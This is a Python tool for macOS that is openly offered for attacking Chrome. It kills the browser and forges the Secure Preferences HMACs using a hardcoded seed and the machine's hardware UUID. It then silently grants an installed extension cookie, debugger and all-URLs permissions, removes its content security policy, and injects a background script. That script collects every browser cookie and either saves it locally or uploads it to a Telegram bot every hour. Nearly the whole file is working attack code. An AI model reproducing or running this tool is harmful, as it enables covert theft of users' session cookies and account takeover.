# flake8: noqa
#!/usr/bin/env python3
"""
Chrome Secure Preferences Exploitation Tool (macOS Version)

This script exploits a vulnerability in Chrome's Secure Preferences file to silently
modify a Chrome extension, granting it additional permissions to access cookies and
other sensitive data.

The vulnerability exists because Chrome uses an easily computed seed value for HMAC calculation
to protect the Secure Preferences file. By using this seed, we can calculate valid
HMAC values for modified preferences.

This version is optimized for macOS and handles all three steps:
1. Kill Chrome
2. Modify Chrome files
3. Restart Chrome and exfiltrate cookies via background script (locally by dumping to a file or via telegram by sending cookies to Telegram bot)
"""

import argparse
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
import time
from collections import OrderedDict
from pathlib import Path


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Chrome Secure Preferences Exploitation Tool (macOS Version)"
    )
    parser.add_argument(
        "--id",
        type=str,
        required=True,
        help="Extension ID to modify",
    )
    parser.add_argument(
        "--kill-after",
        action="store_true",
        help="Kill Chrome after waiting (default: leave Chrome running)",
    )
    parser.add_argument(
        "--wait-time",
        type=int,
        default=15,
        help="Time to wait before killing Chrome if --kill-after is used (seconds)",
    )
    parser.add_argument(
        "--telegram-token",
        type=str,
        help="Telegram bot token for cookie exfiltration",
    )
    parser.add_argument(
        "--telegram-chat-id",
        type=str,
        help="Telegram chat ID for cookie exfiltration",
    )
    parser.add_argument(
        "--exfil-method",
        type=str,
        choices=["local", "telegram"],
        default="local",
        help="Method to exfiltrate cookies (local: save to file, telegram: send to Telegram bot)",
    )
    return parser.parse_args()


def check_macos():
    """Check if the script is running on macOS."""
    if sys.platform != "darwin":
        print("[!] Error: This script is designed to run only on macOS.")
        print(f"[!] Detected platform: {sys.platform}")
        sys.exit(1)
    return True


def kill_chrome():
    """Kill all running Chrome processes on macOS."""
    print("[*] Killing Chrome processes...")
    subprocess.run(["pkill", "-a", "-i", "Google Chrome"], check=False)

    # Give Chrome time to fully close
    print("[*] Waiting 5 seconds for Chrome to fully close...")
    time.sleep(5)


def get_device_id():
    """Get the device ID (Hardware UUID) used for HMAC calculation on macOS."""
    sid = subprocess.check_output(
        ["system_profiler", "SPHardwareDataType"], universal_newlines=True
    )
    found = re.search("Hardware UUID: (.*)", sid)
    return found.group(1)


def get_chrome_user_data_dir():
    """Get the Chrome user data directory on macOS."""
    return Path.home() / "Library/Application Support/Google/Chrome"


def find_secure_preferences_files(extension_id):
    """Find all Secure Preferences files that contain the specified extension."""
    chrome_dir = get_chrome_user_data_dir()
    found_files = []

    # Look in all profile directories
    for profile_dir in chrome_dir.glob("*"):
        if not profile_dir.is_dir():
            continue

        sec_pref_file = profile_dir / "Secure Preferences"
        if not sec_pref_file.exists():
            continue

        try:
            with open(sec_pref_file, "r", encoding="utf-8") as f:
                data = json.load(f)

            # Check if the extension exists in this profile
            if extension_id in data.get("extensions", {}).get("settings", {}):
                ext_path = data["extensions"]["settings"][extension_id].get("path", "")
                if ext_path:
                    ext_dir = profile_dir / "Extensions" / ext_path
                    found_files.append((sec_pref_file, ext_dir))
        except (json.JSONDecodeError, KeyError) as e:
            print(f"[!] Error reading {sec_pref_file}: {e}")

    return found_files


def create_background_script(extension_dir, args):
    """Create or modify the background script to add cookie exfiltration functionality."""
    print(f"[*] Modifying background script at {extension_dir}")

    # Check if extension directory exists
    if not extension_dir.exists():
        print(f"[!] Extension directory not found: {extension_dir}")
        return False

    # Modify manifest.json to add cookie permissions
    manifest_path = extension_dir / "manifest.json"
    if not manifest_path.exists():
        print(f"[!] Manifest file not found: {manifest_path}")
        return False

    try:
        with open(manifest_path, "r", encoding="utf-8") as f:
            manifest = json.load(f)

        # Add cookie permission if not already present
        if "permissions" not in manifest:
            manifest["permissions"] = []

        if "cookies" not in manifest["permissions"]:
            manifest["permissions"].append("cookies")
            print("[+] Added 'cookies' permission to manifest")

        # Add alarms permission if not already present
        if "alarms" not in manifest["permissions"]:
            manifest["permissions"].append("alarms")
            print("[+] Added 'alarms' permission for periodic cookie exfiltration")

        # Remove content security policy if present
        if "content_security_policy" in manifest:
            del manifest["content_security_policy"]
            print("[+] Removed content security policy from manifest")

        # Get the background script path
        background_script_path = None
        if "background" in manifest:
            if "service_worker" in manifest["background"]:
                background_script_path = (
                    extension_dir / manifest["background"]["service_worker"]
                )
            elif (
                "scripts" in manifest["background"]
                and len(manifest["background"]["scripts"]) > 0
            ):
                background_script_path = (
                    extension_dir / manifest["background"]["scripts"][0]
                )

        # If no background script exists, create one
        if not background_script_path:
            background_script_path = extension_dir / "background.js"
            manifest["background"] = {"service_worker": "background.js"}
            print("[+] Created new background script configuration")

        # Write modified manifest back
        with open(manifest_path, "w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=2)

        # Create or append to background script
        background_script = generate_background_script(args)

        # Check if the background script exists
        if background_script_path.exists():
            # Read the existing content to check if our code is already there
            with open(background_script_path, "r", encoding="utf-8") as f:
                existing_content = f.read()

            # Check if our code is already in the file (to avoid duplication)
            if "sendAllCookiesAsFile" in existing_content:
                print(
                    f"[*] Cookie exfiltration code already exists in {background_script_path}, replacing it"
                )
                # Create a new file with our code
                with open(background_script_path, "w", encoding="utf-8") as f:
                    f.write(background_script)
            else:
                # Append our code to the existing file
                with open(background_script_path, "a", encoding="utf-8") as f:
                    f.write(
                        "\n\n// Added by Chrome Secure Preferences Exploitation Tool\n"
                    )
                    f.write(background_script)
                print(
                    f"[+] Appended to existing background script: {background_script_path}"
                )
        else:
            # Create new background script
            with open(background_script_path, "w", encoding="utf-8") as f:
                f.write(background_script)
            print(f"[+] Created new background script: {background_script_path}")

        # If using local exfiltration, also create dump.html
        if args.exfil_method == "local":
            create_dump_files(extension_dir)

        return True
    except Exception as e:
        print(f"[!] Error modifying extension: {e}")
        return False


def generate_background_script(args):
    """Generate the background script based on the exfiltration method."""
    if args.exfil_method == "telegram":
        return f"""// Background service worker for communication with Telegram Bot

// Configure your Telegram bot settings
const TELEGRAM_BOT_TOKEN = '{args.telegram_token}'; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = '{args.telegram_chat_id}'; // Replace with your chat ID

// Send all cookies as file function
async function sendAllCookiesAsFile() {{
  try {{
    const allCookies = await chrome.cookies.getAll({{}});
    console.log(`Retrieved ${{allCookies.length}} total cookies`);
    
    // Prepare the complete data
    const completeData = {{
      event: 'cookies_export',
      timestamp: new Date().toISOString(),
      cookiesCount: allCookies.length,
      cookies: allCookies
    }};
    
    const jsonData = JSON.stringify(completeData, null, 2);
    
    // Convert JSON to Blob for file upload
    const blob = new Blob([jsonData], {{ type: 'application/json' }});
    
    // Create filename with timestamp
    const filename = `cookies_${{new Date().toISOString().replace(/[:.]/g, '-')}}.json`;
    
    // Send as document
    await sendDocumentToTelegram(blob, filename, `📋 Cookies Export\\n📊 Total cookies: ${{allCookies.length}}`);
    
    console.log('All cookies sent as file successfully');
    
  }} catch (error) {{
    console.error('Failed to send cookies to Telegram:', error);
    console.error('Error details:', error.message);
    
    // Send error notification to Telegram
    const errorMessage = `❌ Error sending cookies\\n${{error.message}}\\n${{new Date().toISOString()}}`;
    await sendToTelegram(errorMessage);
  }}
}}

// Self-invoke function that runs whenever the service worker loads
(async function initialize() {{
  console.log('Service worker initialized');
  
  // Check if alarm already exists
  const existingAlarm = await chrome.alarms.get('sendCookies');
  if (!existingAlarm) {{
    console.log('Setting up alarms as none exist');
    setupHourlySending();
    
    // Send initial cookies report
    await sendAllCookiesAsFile();
  }} else {{
    console.log('Existing alarm found:', existingAlarm);
  }}
}})();

// Listen for browser startup
chrome.runtime.onStartup.addListener(async () => {{
  console.log('Browser started with extension already installed');
  
  // Send all cookies on browser startup
  await sendAllCookiesAsFile();
  
  // Ensure alarm is set up
  setupHourlySending();
}});

// Function to send message to Telegram
async function sendToTelegram(text) {{
  const url = `https://api.telegram.org/bot${{TELEGRAM_BOT_TOKEN}}/sendMessage`;
  
  try {{
    const response = await fetch(url, {{
      method: 'POST',
      headers: {{
        'Content-Type': 'application/json'
      }},
      body: JSON.stringify({{
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      }})
    }});
    
    const responseData = await response.json();
    
    if (!responseData.ok) {{
      console.error('Telegram API error:', responseData.description);
      throw new Error(responseData.description);
    }}
    
    console.log('Message sent successfully to Telegram');
    return responseData;
    
  }} catch (error) {{
    console.error('Failed to send message to Telegram:', error);
    throw error;
  }}
}}

// Function to send document/file to Telegram
async function sendDocumentToTelegram(blob, filename, caption = '') {{
  const url = `https://api.telegram.org/bot${{TELEGRAM_BOT_TOKEN}}/sendDocument`;
  
  try {{
    // Create FormData for file upload
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('document', blob, filename);
    if (caption) {{
      formData.append('caption', caption);
    }}
    
    const response = await fetch(url, {{
      method: 'POST',
      body: formData
    }});
    
    const responseData = await response.json();
    
    if (!responseData.ok) {{
      console.error('Telegram API error:', responseData.description);
      throw new Error(responseData.description);
    }}
    
    console.log('Document sent successfully to Telegram');
    return responseData;
    
  }} catch (error) {{
    console.error('Failed to send document to Telegram:', error);
    throw error;
  }}
}}

// Set up hourly sending using Chrome Alarms API
function setupHourlySending() {{
  // Create an alarm that fires every hour
  chrome.alarms.create('sendCookies', {{
    periodInMinutes: 60
  }});
  
  console.log('Hourly cookie sending scheduled using alarms');
}}

// Listen for alarm events
chrome.alarms.onAlarm.addListener((alarm) => {{
  if (alarm.name === 'sendCookies') {{
    console.log('Alarm triggered: sending hourly cookies export...');
    sendAllCookiesAsFile();
  }}
}});
"""
    else:  # Local exfiltration
        return """// Background script for local cookie exfiltration

// Function to open the dump page
function openDumpPage() {
  chrome.tabs.create({ url: 'dump.html' });
}

// Listen for installation
chrome.runtime.onInstalled.addListener(() => {
  console.log('Extension installed');
  
  // Open dump page on installation
  openDumpPage();
});

// Listen for startup
chrome.runtime.onStartup.addListener(() => {
  console.log('Extension started');
  
  // Open dump page on startup
  openDumpPage();
});
"""


def create_dump_files(extension_dir):
    """Create dump.html and dump.js files in the extension directory."""
    # Create dump.html
    dump_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Cookies</title>
</head>
<body>
    <script src="dump.js"></script>
</body>
</html>"""

    # Create dump.js
    dump_js = """chrome.cookies.getAll({}, function (cookies) {
    const cookieJson = JSON.stringify(cookies, null, 2);
    console.log(cookieJson);
    // Create a new blob with the JSON data
    const blob = new Blob([cookieJson], { type: "application/json" });
    // Create a URL for the blob
    const url = URL.createObjectURL(blob);
    // Create a new link element
    const a = document.createElement("a");
    a.href = url;
    a.download = "cookies.json";
    a.click();
    // Clean up
    URL.revokeObjectURL(url);

    chrome.tabs.getCurrent(function(tab) {
        chrome.tabs.remove(tab.id, function() { });
    });
  });"""

    # Write files
    with open(extension_dir / "dump.html", "w", encoding="utf-8") as f:
        f.write(dump_html)

    with open(extension_dir / "dump.js", "w", encoding="utf-8") as f:
        f.write(dump_js)

    print("[+] Created dump.html and dump.js files")


def remove_empty(d):
    """Remove empty elements from OrderedDict for HMAC calculation."""
    if isinstance(d, OrderedDict):
        t = OrderedDict(d)
        for x, y in t.items():
            if isinstance(y, OrderedDict):
                if len(y) == 0:
                    del d[x]
                else:
                    remove_empty(y)
                    if len(y) == 0:
                        del d[x]
            elif isinstance(y, dict):
                if len(y) == 0:
                    del d[x]
                else:
                    remove_empty(y)
                    if len(y) == 0:
                        del d[x]
            elif isinstance(y, list):
                if len(y) == 0:
                    del d[x]
                else:
                    remove_empty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]
    elif isinstance(d, list):
        for x, y in enumerate(d):
            if isinstance(y, OrderedDict):
                if len(y) == 0:
                    del d[x]
                else:
                    remove_empty(y)
                    if len(y) == 0:
                        del d[x]
            elif isinstance(y, dict):
                if len(y) == 0:
                    del d[x]
                else:
                    remove_empty(y)
                    if len(y) == 0:
                        del d[x]
            elif isinstance(y, list):
                if len(y) == 0:
                    del d[x]
                else:
                    remove_empty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]


def calculate_hmac(value_as_string, path, sid, seed):
    """Calculate HMAC for a specific preference."""
    if isinstance(value_as_string, (dict, OrderedDict)):
        remove_empty(value_as_string)

    message = (
        sid
        + path
        + json.dumps(value_as_string, separators=(",", ":"), ensure_ascii=False)
        .replace("<", "\\u003C")
        .replace("\\u2122", "™")
    )
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)

    return hash_obj.hexdigest().upper()


def calculate_super_mac(json_file, sid, seed):
    """Calculate the super MAC for all preferences."""
    # Read the file
    with open(json_file, "r", encoding="utf-8") as json_data:
        data = json.load(json_data, object_pairs_hook=OrderedDict)

    temp = OrderedDict(sorted(data.items()))
    data = temp

    # Calculate and set the super_mac
    super_msg = sid + json.dumps(data["protection"]["macs"]).replace(" ", "")
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()


def modify_secure_preferences(secure_prefs_file, extension_id, extension_path, sid):
    """Modify the Secure Preferences file to enable the extension."""
    print(f"[*] Modifying Secure Preferences file: {secure_prefs_file}")

    # Chrome's fixed seed for HMAC calculation
    seed = b"\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8"

    # Extension configuration JSON
    extension_json = {
        "active_permissions": {
            "api": [
                "activeTab",
                "cookies",
                "debugger",
                "webNavigation",
                "webRequest",
                "scripting",
            ],
            "explicit_host": ["\u003call_urls>"],
            "manifest_permissions": [],
            "scriptable_host": [],
        },
        "commands": {},
        "content_settings": [],
        "creation_flags": 38,
        "filtered_service_worker_events": {"webNavigation.onCompleted": [{}]},
        "first_install_time": "13364417633506288",
        "from_webstore": False,
        "granted_permissions": {
            "api": [
                "activeTab",
                "cookies",
                "debugger",
                "webNavigation",
                "webRequest",
                "scripting",
            ],
            "explicit_host": ["\u003call_urls>"],
            "manifest_permissions": [],
            "scriptable_host": [],
        },
        "incognito_content_settings": [],
        "incognito_preferences": {},
        "last_update_time": "13364417633506288",
        "location": 4,
        "newAllowFileAccess": True,
        "path": extension_path,
        "preferences": {},
        "regular_only_preferences": {},
        "service_worker_registration_info": {"version": "0.1.0"},
        "serviceworkerevents": ["cookies.onChanged", "webRequest.onBeforeRequest/s1"],
        "state": 1,
        "was_installed_by_default": False,
        "was_installed_by_oem": False,
        "withholding_permissions": False,
    }

    # Convert to OrderedDict for calculation and addition
    dict_extension = json.loads(
        json.dumps(extension_json), object_pairs_hook=OrderedDict
    )

    try:
        # Read the current Secure Preferences file
        with open(secure_prefs_file, "r", encoding="utf-8") as f:
            data = json.load(f, object_pairs_hook=OrderedDict)

        # Add or update the extension settings
        if "extensions" not in data:
            data["extensions"] = OrderedDict()
        if "settings" not in data["extensions"]:
            data["extensions"]["settings"] = OrderedDict()

        data["extensions"]["settings"][extension_id] = dict_extension

        # Calculate HMAC for the extension
        path = "extensions.settings." + extension_id
        macs = calculate_hmac(dict_extension, path, sid, seed)

        # Add HMAC to the protection section
        if "protection" not in data:
            data["protection"] = OrderedDict({"macs": OrderedDict()})
        if "macs" not in data["protection"]:
            data["protection"]["macs"] = OrderedDict()
        if "extensions" not in data["protection"]["macs"]:
            data["protection"]["macs"]["extensions"] = OrderedDict(
                {"settings": OrderedDict()}
            )
        if "settings" not in data["protection"]["macs"]["extensions"]:
            data["protection"]["macs"]["extensions"]["settings"] = OrderedDict()

        data["protection"]["macs"]["extensions"]["settings"][extension_id] = macs

        # Enable developer mode
        data["extensions"]["ui"] = OrderedDict({"developer_mode": True})
        path = "extensions.ui.developer_mode"
        macs = calculate_hmac(True, path, sid, seed)

        if "ui" not in data["protection"]["macs"]["extensions"]:
            data["protection"]["macs"]["extensions"]["ui"] = OrderedDict()

        data["protection"]["macs"]["extensions"]["ui"]["developer_mode"] = macs

        # Write the modified data back to the file
        with open(secure_prefs_file, "w", encoding="utf-8") as f:
            json.dump(data, f)

        # Calculate and update the super MAC
        super_mac = calculate_super_mac(secure_prefs_file, sid, seed)
        data["protection"]["super_mac"] = super_mac

        # Write the final data with updated super MAC
        with open(secure_prefs_file, "w", encoding="utf-8") as f:
            json.dump(data, f)

        print("[+] Successfully modified Secure Preferences file")
        return True
    except Exception as e:
        print(f"[!] Error modifying Secure Preferences file: {e}")
        return False


def launch_chrome(extension_id, wait_time=15, kill_after=False):
    """Launch Chrome and optionally kill it after the specified wait time."""
    print("[*] Launching Chrome...")

    try:
        # Launch Chrome with the restore-last-session flag
        subprocess.run(
            ["open", "-a", "Google Chrome", "--args", "--restore-last-session"],
            check=True,
        )

        # Wait a few seconds for Chrome to start
        print("[*] Waiting 5 seconds for Chrome to start...")
        time.sleep(5)

        print("[+] Chrome launched successfully")

        # If kill_after is enabled, wait for the specified time and then kill Chrome
        if kill_after:
            print(f"[*] Will kill Chrome after waiting {wait_time} seconds...")
            time.sleep(wait_time)
            print("[*] Killing Chrome as requested...")
            subprocess.run(["pkill", "-a", "-i", "Google Chrome"], check=False)
            print("[+] Chrome terminated")
        else:
            print("[+] Leaving Chrome running")

        return True
    except Exception as e:
        print(f"[!] Error launching Chrome: {e}")
        return False


def modify_chrome_files(extension_id, device_id, args):
    """Modify Chrome files (extension and Secure Preferences)."""
    # Find Secure Preferences files with the specified extension
    found_files = find_secure_preferences_files(extension_id)

    if not found_files:
        print(
            f"[!] Could not find Secure Preferences file with extension ID: {extension_id}"
        )
        return False

    print(f"[+] Found {len(found_files)} Secure Preferences file(s) with the extension")

    success_count = 0
    for secure_prefs_file, extension_dir in found_files:
        print(f"\n[*] Processing: {secure_prefs_file}")

        # Modify the extension
        if not create_background_script(extension_dir, args):
            continue

        # Modify the Secure Preferences file
        ext_path = str(extension_dir).split("Extensions/")[-1]
        if modify_secure_preferences(
            secure_prefs_file, extension_id, ext_path, device_id
        ):
            success_count += 1

    if success_count == 0:
        print("[!] Failed to modify any files")
        return False

    return True


def main():
    """Main function."""
    # Check if running on macOS
    check_macos()

    args = parse_arguments()

    # Validate arguments
    if args.exfil_method == "telegram" and (
        not args.telegram_token or not args.telegram_chat_id
    ):
        print(
            "[!] Error: Telegram token and chat ID are required for Telegram exfiltration"
        )
        return 1

    # Always kill Chrome before modifying
    kill_chrome()

    # Get device ID for HMAC calculation
    device_id = get_device_id()
    print(f"[*] Device ID: {device_id}")

    # Modify Chrome files
    if not modify_chrome_files(args.id, device_id, args):
        return 1

    # Always launch Chrome after modifying
    launch_chrome(args.id, args.wait_time, args.kill_after)

    print("[+] Operation completed successfully")
    return 0


if __name__ == "__main__":
    sys.exit(main())
